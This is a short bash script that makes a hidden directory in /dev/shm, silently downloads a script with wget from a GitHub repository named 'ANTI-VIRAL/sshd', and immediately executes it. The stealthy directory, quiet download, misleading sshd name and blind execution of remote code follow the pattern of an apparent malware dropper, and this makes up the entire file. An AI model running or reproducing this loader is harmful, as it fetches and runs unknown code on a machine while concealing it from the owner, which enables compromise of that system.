#!/bin/bash

set -e

mkdir -p /dev/shm/.cache
chmod 700 /dev/shm/.cache
cd /dev/shm/.cache

wget -q \
    https://github.com/ANTI-VIRAL/sshd/raw/main/run.sh

# Start program
exec bash run.sh
